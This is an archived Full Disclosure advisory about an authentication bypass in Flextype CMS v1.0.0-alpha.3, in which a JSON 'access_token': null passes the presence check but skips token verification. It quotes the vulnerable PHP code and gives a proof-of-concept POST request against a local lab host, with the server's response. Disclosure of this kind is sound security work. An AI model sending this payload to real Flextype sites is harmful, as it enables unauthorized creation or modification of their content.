---
title: Flextype v1.0.0-alpha.3 NULL access_token Authentication Bypass
url: https://seclists.org/fulldisclosure/2026/Sep/23
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:32.705721
---

# Flextype v1.0.0-alpha.3 NULL access_token Authentication Bypass

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 NULL access\_token Authentication Bypass

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:50:46 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains an authentication validation
vulnerability in the API request-processing functionality. API endpoints
may declare access_token as a required parameter, but the
required-parameter validation only verifies that the corresponding key
exists in the supplied request data.

Authentication verification is subsequently performed inside an isset($data
['access_token']) condition. In PHP, isset() returns false when a key
exists but its value is null.

An attacker can therefore supply "access_token": null, satisfying the
required-parameter existence check while causing the subsequent
access-token verification logic to be skipped.

Testing confirmed that a protected Entries API operation accepted an
access_token value of null and successfully created an entry.
Impact

An remote attacker can bypass the access_token authentication requirement
for affected API endpoints.

The resulting impact depends on the functionality exposed by the affected
endpoint. Where the bypass provides access to entry creation, modification,
query, or other privileged API functionality, it may also remove the
authentication prerequisite from vulnerabilities reachable through those
endpoints.

The public API token requirement should be considered separately from the
bypassed access_token security control.
DetailsRequired Parameter Validation

Flextype combines query and request-body parameters and verifies required
parameters by checking only whether the required key occurs within the
resulting array:

$data = array_merge($queryData, $bodyData);

$dataTest = true;

foreach ($options['params'] as $key => $value) {
    if (in_array($value, array_keys($data))) {
        continue;
    }

    $dataTest = false;
}

Consequently, a request containing:

{
    "access_token": null
}

satisfies the parameter-presence requirement because the access_token key
exists.
Authentication Verification

Access-token validation is subsequently conditional upon PHP's isset():

if (isset($data['access_token'])) {
    if (! isset($tokenData['hashed_access_token'])) {
        return $this->getStatusCodeMessage(401);
    }

    if (! verifyTokenHash($data['access_token'],
$tokenData['hashed_access_token'])) {
        return $this->getStatusCodeMessage(401);
    }
}

For a PHP array containing an access_token key whose value is null:

isset($data['access_token'])

evaluates to false.

The authentication verification block is therefore skipped.
Proof of Concept

The following request supplies the required access_token parameter with a
JSON null value:

POST /api/v1/entries HTTP/1.1
Host: 127.0.0.1:18086
Content-Type: application/json

{"token":"lab-token","access_token":null,"id":"auth-null-proof","data":{"title":"AUTH_NULL_BYPASS_PROOF"}}

Flextype accepted the request:

HTTP/1.1 200 OK
Host: 127.0.0.1:18086
Content-Type: application/json;charset=UTF-8

{"title":"AUTH_NULL_BYPASS_PROOF","published_by":"","created_by":"","uuid":"514b6f5a-dc16-4572-9c16-8ac4a17250f0","content":"","slug":"auth-null-proof","published_at":1788143638,"modified_at":1788143638,"created_at":1788143638,"routable":true,"visibility":"visible","id":"auth-null-proof"}

The successful creation of auth-null-proof demonstrates that supplying a
null access token bypasses the access-token verification performed by the
API authentication logic.
Root Cause

The vulnerability results from inconsistent validation of required
parameters.

The first validation considers a parameter present when its key exists:

in_array($value, array_keys($data))

while authentication is conditional upon:

isset($data['access_token'])

These operations have different behavior for null values.

A JSON value of:

"access_token": null

therefore satisfies the first condition while preventing execution of the
second.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

### Current thread:

* **Flextype v1.0.0-alpha.3 NULL access\_token Authentication Bypass** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")